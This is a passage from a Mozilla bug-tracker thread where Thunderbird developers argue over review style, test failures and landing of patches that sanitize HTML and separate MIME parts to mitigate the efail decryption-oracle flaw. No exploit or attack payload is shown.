[Attachment #8976086](/attachment.cgi?id=8976086&action=edit "Sanitize quoted HTML, v3") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 98](/show_bug.cgi?id=1419417#c98)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #94](/show_bug.cgi?id=1419417#c94 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
Let's not discuss about style nits, you're wasting more time on the discussion than actually fixing them, or just picking up what I have already fixed.
I know that MIME is old code with a hotchpotch of ugliness and I am certainly opposed to adding more ugliness.
The style-guide says that all sentences get a full stop at the end, so it doesn't hurt to add them. There are pre-existing examples:
// SaveAs in new modes doesn't work yet.
/\* Use the class we've got. \*/
/\* Descend into messages only if we're looking for a specific sub-part. \*/
/\* First initialize the superclass. \*/
We don't use spaces before parameter lists for the obvious reason of being able to search for functions with "XXX(". There are pre-existing cases of this in MIME, for example (at random):
mime\_subclass\_p(MimeObjectClass \*child, MimeObjectClass \*parent)
mime\_imap\_part\_address(MimeObject \*obj)
We don't use spaces after a cast, which you do correctly in your patch on some occasions:
int status = ((MimeObjectClass\*)&MIME\_SUPERCLASS)->parse\_eof(obj, abort\_p);
Because in the past no one enforced a consistent style in MIME we're at the mess we are now. So please no further discussion, just fix what I asked for. Correct style should be automatic and then you can focus on the actual problem.
Further comments on the tree patches presented:
"Sanitizer code cleanup, v2":
You misunderstood what a "hidden" preference is. The preference in question is listed in mailnews.js and therefore listed in about:config. We have real hidden preferences that don't show up there. It is also widely discussed on the web, please Google it. We even get complaints when changing real "hidden" preferences (last for mail.ui.display.dateformat.thisweek and friends). So I don't think it's a good idea to change the name unless you offer some migration, which is easy to do:
<https://dxr.mozilla.org/comm-central/source/mail/base/modules/mailMigrator.js>
Also please present a patch that applies to trunk.
"Sanitize quotes, v4 (for 52)":
I haven't tried this but I'd like to hear how you plan to go about the M-C change included in the patch. Are you going to present this for review in M-C. Once landed in trunk, we could then uplift it to our branches. We usually don't take patches are not in M-C and don't have a plan to ever get there. In general, rules for all contributors to Mozilla code apply to you as well: So please don't mix hunks from different repositories in the same patch, since by definition the patch already doesn't apply and needs manual intervention by all people working on it. Please supply patches with proper HG headers stating your user and a decent commit message. This is essential even earlier on, for example for try pushes.
"Separate MIME parts from each other, v4 (trunk and 52)"
That looks promising, I haven't reviewed it yet, I've just flagged some obvious style issues, made it apply to trunk and shipped it off to try. Please address the test failures:
TEST-UNEXPECTED-FAIL | comm/mailnews/db/gloda/test/unit/test\_mime\_attachments\_size.js
TEST-UNEXPECTED-FAIL | comm/mailnews/db/gloda/test/unit/test\_mime\_emitter.js
I'm not happy to distribute code to 10-25 million users where the own author added this comment:
+ /\* honestly, I don't know how that charset stuff works in libmime.
+ The part in mimethtm doesn't make much sense to me either.
+ I'll just dump the charset we get in the mime headers into a
+ HTML meta http-equiv.
+ XXX Not sure, if that is correct, though. \*/
Maybe that needs further investigation since TB was riddled with charset issues (before I cleaned most/all of the up) and mojibake caused by wrong charset selection is not acceptable. Oh, I see, was copied from mimethsa.cpp, so perhaps you can include that comment in your clean-up.
As for the review: I haven't had time to actually understand what the patch does, perhaps you can explain it or point me to the comment where that was already explained. You're adding a new MIME class mimeInlineTextHTMLParsedClass and I see code that switches to using that new class. Can the old one mimeInlineTextHTMLClass be removed? Running with the patch, I see horizontal lines between the different parts now. Where do these get added? I think we need to add some class and CSS since currently they don't appear to have any margins/spacing and are just glued to the preceding text.
Final comment: Ben, I appreciate your expertise in this area and your contribution here. Please adhere to the rules that apply to everyone in the project to make collaboration as smooth as possible. I know you're working on an urgent security problem (or better, one that has finally become urgent), so we will need to cut some corners in the process but code formatting and covering all cases (see charset) won't be one of them.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 99](/show_bug.cgi?id=1419417#c99)• 7 years ago |
|  | |

Comment on [attachment 8976363](/attachment.cgi?id=8976363 "Sanitize quotes, v4 (for 52)") [[details]](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") [[diff]](/attachment.cgi?id=8976363&action=diff "Sanitize quotes, v4 (for 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363)
Sanitize quotes, v4 (for 52)
Review of [attachment 8976363](/attachment.cgi?id=8976363 "Sanitize quotes, v4 (for 52)") [[details]](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") [[diff]](/attachment.cgi?id=8976363&action=diff "Sanitize quotes, v4 (for 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363):
-----------------------------------------------------------------
::: mailnews/compose/src/nsMsgCompose.cpp
@@ +617,5 @@
>
> +/\* This function syncronously sanitizes an HTML document (string->string)
> + using the Gecko nsTreeSanitizer.
> + This is a modified copy of the code in mimemoz2.cpp.
> +\*/
This ugly comment style may be found in MIME, but we prefer not to have it in compose.
@@ +625,5 @@
> + uint32\_t flags = nsIParserUtils::SanitizerCidEmbedsOnly |
> + nsIParserUtils::SanitizerDropForms |
> + nsIParserUtils::SanitizerAllowStyle;
> +
> + // Implementation in dom/base/nsTreeSanitizer.cpp
We have DXR to track this. So please lose the comment.
::: dom/base/nsTreeSanitizer.cpp
@@ -945,5 @@
> {
> - if (mCidEmbedsOnly) {
> - // Sanitizing styles for external references is not supported.
> - mAllowStyles = false;
> - }
Please move this to a separate patch and get it reviewed by the appropriate peer. Or what is the plan for this hunk?

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 100](/show_bug.cgi?id=1419417#c100)• 7 years ago |
|  | |

Additional comment: You said in [comment #86](/show_bug.cgi?id=1419417#c86 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") that sanitising is a safety measure. Should we move that to a different bug since this one here is quickly becoming confusing and the solution also needs an M-C change?

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 101](/show_bug.cgi?id=1419417#c101)• 7 years ago |
|  | |

> I'm not happy to distribute code to 10-25 million users where the own author added this comment:
That's an old comment that I had copied. Turns out, that code apparently works fine since ~15 years for those 25 millions.
That's also why I removed it. You probably merely noticed the removal.
> Let's not discuss about style nits
Yes, so why do you?
> We don't use spaces before parameter lists
I know, normally, but not here. libmime is different. I was simply copying code as a template for my class.
<<https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/Coding_Style>> says:
"The following norms should be followed for new code. For existing code, use the prevailing style in a file or module."
> I haven't had time to actually understand what the patch does
> I haven't reviewed it yet, I've just flagged some obvious style issues
That's the classic bikeshed <<https://en.wikipedia.org/wiki/Law_of_triviality>>.
I'd rather focus on how we can get the users as secure as possible.
I had spent the entire night coding this, to get this out as quickly as possible. I have already fixed a number of things you wanted fixed, including whitespace, and now you want more changes. It's one day later, and we're no closer.
I'd be happy to discuss the merits of the patch with you on the phone, and explain everything. As long as we agree to focus on securing end users.

|  | [Wayne Mery (:wsmwk)](/user_profile?user_id=29811) |  |
| --- | --- | --- |
| [Comment 102](/show_bug.cgi?id=1419417#c102)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #101](/show_bug.cgi?id=1419417#c101 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> ...
> > I haven't had time to actually understand what the patch does
> > I haven't reviewed it yet, I've just flagged some obvious style issues
>
> That's the classic bikeshed
> <<https://en.wikipedia.org/wiki/Law_of_triviality>>.
>
> I'd rather focus on how we can get the users as secure as possible.
>
> I had spent the entire night coding this, to get this out as quickly as
> possible. I have already fixed a number of things you wanted fixed,
> including whitespace, and now you want more changes. It's one day later, and
> we're no closer.
Bikeshed or not, Jorg's goal is to do a proper review. And if it's not done by Jorg then it will be someone else. So let's have the goal be not just security but a fully vetted patch.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 103](/show_bug.cgi?id=1419417#c103)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #101](/show_bug.cgi?id=1419417#c101 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> > Let's not discuss about style nits
> Yes, so why do you?
I was just doing a (pre-)review and you keep on discussing.
> <<https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/>
> Coding\_Style> says:
> "The following norms should be followed for new code. For existing code, use
> the prevailing style in a file or module."
Please read [comment #98](/show_bug.cgi?id=1419417#c98 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") again. I've copied examples from \*existing\* code that do it right. I don't have the time now to do a statistical analysis to see what's "prevailing". As far as I can tell, MIME is a mess, so we can just use "correct" style now.
> I had spent the entire night coding this, to get this out as quickly as
> possible. I have already fixed a number of things you wanted fixed,
> including whitespace, and now you want more changes. It's one day later, and
> we're no closer.
Ben, please read [comment #98](/show_bug.cgi?id=1419417#c98 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") again. There are rules that apply to anyone in Mozilla. You're not exempt, neither are other Mozilla luminaries, like Boris and Ehsan. The only difference it that when they are pointed at a nit, they just fix it. We're not closer to anything, since you submitted patches that don't apply to trunk, had no try run, no commit messages and mixed hunks from different repos. Who do you think should fix all this before landing?
> I'd be happy to discuss the merits of the patch with you on the phone, and
> explain everything. As long as we agree to focus on securing end users.
I prefer to document this in writing here.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 104](/show_bug.cgi?id=1419417#c104)• 7 years ago |
|  | |

Comment on [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351)
Sanitizer code cleanup, v2
r- due to ...
Formal reasons:
- Patch doesn't apply to trunk.
- No commit message.
Factual reasons:
- Not a good a idea to change preference names at 52.8.x or 52.9.x.
The preference in question is publicised on the web.
- Would be OK to change for TB 60, but only with migration code
(which is easy to do).
[Attachment #8976351](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") -
Flags: review-

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 105](/show_bug.cgi?id=1419417#c105)• 7 years ago |
|  | |

Comment on [attachment 8976363](/attachment.cgi?id=8976363 "Sanitize quotes, v4 (for 52)") [[details]](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") [[diff]](/attachment.cgi?id=8976363&action=diff "Sanitize quotes, v4 (for 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363)
Sanitize quotes, v4 (for 52)
f- due to formal reasons:
- No commit message
- Mix of hunks for C-C and M-C
- Yes, it says "for 52", but doesn't help us. We need to land on
trunk first, make sure all the tests pass, then uplift after
maybe a short ride on beta.
[Attachment #8976363](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") -
Flags: feedback-

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 106](/show_bug.cgi?id=1419417#c106)• 7 years ago |
|  | |

Comment on [attachment 8976349](/attachment.cgi?id=8976349 "Separate MIME parts from each other, v4 (trunk and 52)") [[details]](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") [[diff]](/attachment.cgi?id=8976349&action=diff "Separate MIME parts from each other, v4 (trunk and 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349)
Separate MIME parts from each other, v4 (trunk and 52)
Review of [attachment 8976349](/attachment.cgi?id=8976349 "Separate MIME parts from each other, v4 (trunk and 52)") [[details]](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") [[diff]](/attachment.cgi?id=8976349&action=diff "Separate MIME parts from each other, v4 (trunk and 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349):
-----------------------------------------------------------------
Repeating from [comment #98](/show_bug.cgi?id=1419417#c98 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
- This causes test failures.
- Not sure whether the new class completely replaces the old.
- Not sure where the horizontal lines come from. They would be OK if styled properly with margins/spacing.
::: mailnews/mime/src/mimei.cpp
@@ -328,5 @@
> return
> !(
> (avoid\_html
> && (
> - clazz == (MimeObjectClass \*)&mimeInlineTextHTMLClass
Can the class whose usage you're removing be removed completely? If so, please do. If not, please explain in which cases which class is used.

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 107](/show_bug.cgi?id=1419417#c107)• 7 years ago |
|  | |

Can you invitehanno@hboeck.de to this bug?

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 108](/show_bug.cgi?id=1419417#c108)• 7 years ago |
|  | |

Why? He's a journalist and asked why this is progressing so slowly in an e-mail to the Council. I don't see any reason to add him here. So far, this is confidential, so I woudn't add a representative of the press.

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 109](/show_bug.cgi?id=1419417#c109)• 7 years ago |
|  | |

He found a bypass for the current mitigation which may be interesting :)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 110](/show_bug.cgi?id=1419417#c110)• 7 years ago |
|  | |

Maybe he wants to file a new bug then. We're already at [comment #110](/show_bug.cgi?id=1419417#c110 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") here and the bug is getting more and more confusing.
If he found a bypass for (which?) current mitigation, then it doesn't belong here since this mitigation here wasn't shipped yet. Or did he apply the patches, compiled and then found that the specific solution proposed in the patches here doesn't work. Only then we're interested in this bug, anything else needs to go elsewhere.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 111](/show_bug.cgi?id=1419417#c111)• 7 years ago |
|  | |

> - Not sure whether the new class completely replaces the old.
Yes, it does. You can see
- Not sure where the horizontal lines come from. They would be OK if styled properly with margins/spacing.
> > For existing code, use the prevailing style in a file or module.
> I don't have the time now to do a statistical analysis to see what's "prevailing". As far as I can tell, MIME is a mess
Simply open a random typical libmime file, like mimehdrs.cpp, mimethtm.cpp, mimeebod.cpp.
If I now start using a different style, as you ask me to, \*that\* would be a "mess".
::: mailnews/mime/src/mimei.cpp
@@ -328,5 @@
> (avoid\_html
> && (
> - clazz == (MimeObjectClass \*)&mimeInlineTextHTMLClass
> Can the class whose usage you're removing be removed completely?
No, because it's the base class for this one here, and for the sanitizer.
Also, I would like to leave it in, in case we go back to straight pass-thought. I'll explain more to you in person why.
> He's a journalist and asked why this is progressing so slowly in an e-mail to the Council
He's got a point...
> > I'd be happy to discuss the merits of the patch with you on the phone, and
> > explain everything. As long as we agree to focus on securing end users.
> I prefer to document this in writing here.
I tried to reach you on the phone twice, but couldn't reach you.
This back and forth in async writing, and waiting for each answer for hours, takes too much time, both calendar time and my work time.
I'd like to get this finished. If we can work together on this, in realtime, we can get this done in a matter of 2-3 hours. We can't have this drag on like that. I neither have the time, nor can the users wait any longer. My offer to collaborate is there. You have my phone number.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 112](/show_bug.cgi?id=1419417#c112)• 7 years ago |
|  | |

Sorry, half finished comment:
> > - Not sure whether the new class completely replaces the old.
Yes, it does. You can see that in mimei.cpp. That's the switchboard class that decides which class implements what.
The only reference I left in is the "avoid" blacklist, and that's just a safety net.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 113](/show_bug.cgi?id=1419417#c113)• 7 years ago |
|  | |

Comment on [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351)
Sanitizer code cleanup, v2
Review of [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351):
-----------------------------------------------------------------
I don't care much about the pref, but this (and other patches) need to apply to trunk. Yes we want to move as fast as possible, but patches need to land on trunk before elsewhere.
[Attachment #8976351](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") -
Flags: review?(mkmelin+mozilla)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 114](/show_bug.cgi?id=1419417#c114)• 7 years ago |
|  | |

(In reply to Jens Müller from [comment #109](/show_bug.cgi?id=1419417#c109 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> He found a bypass for the current mitigation which may be interesting :)
Could you file a new bug where you expand on this? You can use "Clone this bug" link below.Flags: needinfo?(jens.a.mueller)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 115](/show_bug.cgi?id=1419417#c115)• 7 years ago |
|  | |

Comment on [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351)
Sanitizer code cleanup, v2
Actually, maybe it doesn't make sens to allow css for this use case. People chose to view Plain HTML and have to live with that it's not pretty.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 116](/show_bug.cgi?id=1419417#c116)• 7 years ago |
|  | |

Ben, to get positive review of the "Separate MIME parts from each other, v4 (trunk and 52)" patch, can you please address the test failures. The horizontal lines without margins/spacing are another \*real\* issue aside from the style discussion.
Please document what you have to say about the technical issues here. It needs to be documented. Phone calls are not the normal form of developer communication in Mozilla. Typically an issue can be settled within a day if all participants are in the same time zone and reply a few times during the day.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 117](/show_bug.cgi?id=1419417#c117)• 7 years ago |
|  | |

> Please document what you have to say about the technical issues here
Is there anything that you're missing in [comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"), which gives the big overview?
And the comments when I attached the patches, e.g. [comment 69](/show_bug.cgi?id=1419417#c69 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"), [comment 73](/show_bug.cgi?id=1419417#c73 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") and [comment 92](/show_bug.cgi?id=1419417#c92 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") and [comment 97](/show_bug.cgi?id=1419417#c97 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")?
> The horizontal lines
Honestly, I don't know where they come from, but they are not coming from my code.
> can you please address the test failures
It's not surprising that they fail, given that we intentionally change the output here.
I don't have the test suite set up, and last time I tried, it cost me a whole day to get it running. Could you please help me out there adapting the tests? That would be much appreciated.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 118](/show_bug.cgi?id=1419417#c118)• 7 years ago |
|  | |

Attached image
[tb-efail-attachment-separators.png](attachment.cgi?id=8976703) (obsolete)
— [Details](attachment.cgi?id=8976703&action=edit)

> > The horizontal lines
> Honestly, I don't know where they come from
I found out. These are the inline attachment delimiters that Thunderbird always puts between the different documents/attachments.
You can easily reproduce that by sending yourself an email with HTML attachments (or plaintext, for that matter). You will see horizontal lines. For illustration, I used empty HTML documents, and opened them in a 52.8.0 without my patches, and made a screenshot, attached here.
In the screenshot, you will see "empty.html" in the line, which makes the purpose of these lines clear. That's obviously the file name of the attachment shown, and the name is taken from the MIME headers Content-Type: name="" or Content-Disposition: filename="".
Now, when you open the attack email in a 52.8.0, you don't see these lines. But you should. That you don't see them is an effect of the attack in action and code failing to do what's intended. We never intended for an S/MIME part to be between 2 HTML parts.
When you open the attack email with my patch, you see the attachment separator lines again. That's not a bug, but actually the normal Thunderbird behavior (see above), and a sign of things working normally.
So, why is the filename missing? Remember that the attack emails are hand-crafted, so they're not playing as nice. They do not contain the file name, just "Content-Type: text/html", no name="", nothing else, and no other MIME header. So, we don't have a file name to display, and we do the only reasonable thing we can do: display a horizontal line between the different attachments. Given that the attachments are themselves empty, you end up seeing only these lines.
This test email is looking odd only because it's a specifically crafted attack email with no content, no filename, odd MIME output etc..
So, in fact, these lines are working as they should.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 119](/show_bug.cgi?id=1419417#c119)• 7 years ago |
|  | |

Comment on [attachment 8976703](/attachment.cgi?id=8976703 "tb-efail-attachment-separators.png") [[details]](/attachment.cgi?id=8976703&action=edit "tb-efail-attachment-separators.png")
tb-efail-attachment-separators.png
(Obsoleting screenshot, because it's only answering Jörg's valid question, but not otherwise adding value to this bug.)
[Attachment #8976703](/attachment.cgi?id=8976703&action=edit "tb-efail-attachment-separators.png") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 120](/show_bug.cgi?id=1419417#c120)• 7 years ago |
|  | |

Attached image
[horizontal lines.png](attachment.cgi?id=8976711)
— [Details](attachment.cgi?id=8976711&action=edit)

Richard, could you please load the e-mail in [attachment 8975458](/attachment.cgi?id=8975458 "A1-dec-pgp-smime-html-reply.eml") [[details]](/attachment.cgi?id=8975458&action=edit "A1-dec-pgp-smime-html-reply.eml") (which you encoded for me a little while ago) and apply patch "Separate MIME parts from each other, v4 (trunk and 52)". You should see what is shown in the picture. Sadly the horizontal lines have no margin/padding. Could you find our their class and add CSS to make the thing look a bit better.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 121](/show_bug.cgi?id=1419417#c121)• 7 years ago |
|  | |

Comment on [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351)
Sanitizer code cleanup, v2
> I don't care much about the pref,
Thanks for being pragmatic, Magnus.
Given that I AllowStyles doesn't actually work with CIDOnly, it would need the mozilla-central hunk from Sanitize composer, v4 patch, it makes sense to remove that part from the patch. That then also makes the pref name change moot, so I can revert that as well. That would make this "cleanup" a pure code cleanup with no functional changes. So, it's for trunk only anyway.
> but this (and other patches) need to apply to trunk
Yes.
I'll try to make patches for trunk, but I can't promise it, because I'm running out of work time on this here.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15318089_22599)• 7 years ago |

Blocks: [1462473](/show_bug.cgi?id=1462473 "RESOLVED DUPLICATE - [efail] Bypassing 58.7.0 <form> mitigation")

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 122](/show_bug.cgi?id=1419417#c122)• 7 years ago |
|  | |

(In reply to Jens Müller from [comment #109](/show_bug.cgi?id=1419417#c109 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> [Hanno Böck] found a bypass for the current mitigation which may be interesting :)
I've emailed him, and he sent me the exploit. I've filed [bug 1462473](/show_bug.cgi?id=1462473 "RESOLVED DUPLICATE - [efail] Bypassing 58.7.0 <form> mitigation") and attached the email.
My fixes in this bug here fix that attack, too.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 123](/show_bug.cgi?id=1419417#c123)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #117](/show_bug.cgi?id=1419417#c117 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Is there anything that you're missing in [comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"), which gives the big
> overview?
> And the comments when I attached the patches, e.g. [comment 69](/show_bug.cgi?id=1419417#c69 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"), [comment 73](/show_bug.cgi?id=1419417#c73 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")
> and [comment 92](/show_bug.cgi?id=1419417#c92 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") and [comment 97](/show_bug.cgi?id=1419417#c97 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")?
Thanks, I reread that. It's still unclear why we can't kill mimeInlineTextHTMLClass. I'm not familiar with (pseudo-)"classes" in MIME, as far as I know the code, it's a mess of passing function pointers around and has little to do with OO design or a C++ class hierarchy. Mercurial can certainly resurrect old code if necessary.
> > The horizontal lines
> Honestly, I don't know where they come from, but they are not coming from my
> code.
I've asked Richard to look into some CSS for them.
> I don't have the test suite set up, and last time I tried, it cost me a
> whole day to get it running. Could you please help me out there adapting the
> tests? That would be much appreciated.
Very simple, you add |ac\_add\_options --enable-tests| to your .mozconfig.
You run the tests, assuming M-C as top source dir with:
./mach xpcshell-test comm/mailnews/db/gloda/test/unit/test\_mime\_attachments\_size.js
./mach xpcshell-test comm/mailnews/db/gloda/test/unit/test\_mime\_emitter.js
Otherwise it's:
mozilla/mach xpcshell-test mailnews/db/gloda/test/unit/test\_mime\_attachments\_size.js
The latter failure looks trivial:
"<html><head></head><body>I am HTML! Woo! </body></html>" ==
"<html><head>\\n<meta http-equiv=\\"content-type\\" content=\\"text/html; \\"></head><body>I am HTML! Woo! \\n\\n</body></html>"
Looks like you just need to change the test expectancy here.
(As you know, my contract is currently on hold, so I'm back to volunteer status and I exhausted the promised volunteer hours for this week already fixing bustages so we can actually run tests and land these patches when ready. I trust you understand that I won't be able to assist further.)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 124](/show_bug.cgi?id=1419417#c124)• 7 years ago |
|  | |

Please CC the usual suspects on [bug 1462473](/show_bug.cgi?id=1462473 "RESOLVED DUPLICATE - [efail] Bypassing 58.7.0 <form> mitigation").Flags: needinfo?(jens.a.mueller)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15319315_22599)• 7 years ago |

See Also: → [1462481](/show_bug.cgi?id=1462481 "RESOLVED FIXED - HTML Sanitizer class cleanup")

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15319398_22599)• 7 years ago |

[Attachment #8976085](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") -
Attachment is obsolete: false

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 125](/show_bug.cgi?id=1419417#c125)• 7 years ago |
|  | |

Comment on [attachment 8976085](/attachment.cgi?id=8976085 "Sanitizer code cleanup") [[details]](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") [[diff]](/attachment.cgi?id=8976085&action=diff "Sanitizer code cleanup") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085)
Sanitizer code cleanup
Sanitizer cleanup moved to [bug 1462481](/show_bug.cgi?id=1462481 "RESOLVED FIXED - HTML Sanitizer class cleanup")
[Attachment #8976085](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15320447_22599)• 7 years ago |

[Attachment #8976351](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15320880_22599)• 7 years ago |

Depends on: [1462488](/show_bug.cgi?id=1462488 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying")

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 126](/show_bug.cgi?id=1419417#c126)• 7 years ago |
|  | |

